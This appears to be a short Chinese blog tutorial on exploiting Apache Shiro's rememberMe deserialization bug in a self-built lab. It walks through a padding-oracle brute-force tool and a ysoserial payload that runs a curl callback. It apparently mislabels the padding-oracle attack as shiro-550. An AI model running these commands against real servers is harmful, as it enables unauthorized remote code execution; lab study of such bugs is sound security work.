前言

平时项目过程中如果遇到能跑出key和gadget的shiro，是进入内网的非常便捷的手段。而这种情况下我们利用的都是shiro-550这个漏洞。

最近看到一个该漏洞的利用工具，用go编写，支持爆破任务“断点续传”，故本文记录该工具的使用过程。

环境搭建

这里选择1.4.1版本进行漏洞测试：https://github.com/apache/shiro/releases/tag/shiro-root-1.4.1

下载源码，在IDEA中打开，等待maven依赖下载编译完成（需提前准备好maven环境），使用编译好的samples-web:war exploded作为部署包，配置tomcat跑起来即可。其他环境部署可以参考这篇文章：https://www.cnblogs.com/backlion/p/14077791.html

工具使用

工具下载地址：https://github.com/wabzsy/ShiroPaddingOracle

1. 编译工具

go build main.go

2. 登录shiro we应用后台，获取rememberMe cookie

登录成功后，获取rememberMe cookie：

将其保存为rememberMe.txt。

3. 生成反序列化payload

java -jar ysoserial.jar CommonsCollections1 "curl http://192.168.88.1:8888/aaa" > payload.ser

4. 运行工具进行爆破

main.exe -u http://192.168.88.1:8080/samples_web_war_exploded/ -p payload.ser -i rememberMe.txt

总结

该漏洞本身利用条件大，需要发送大量请求。同时会在目标服务器产生大量日志。
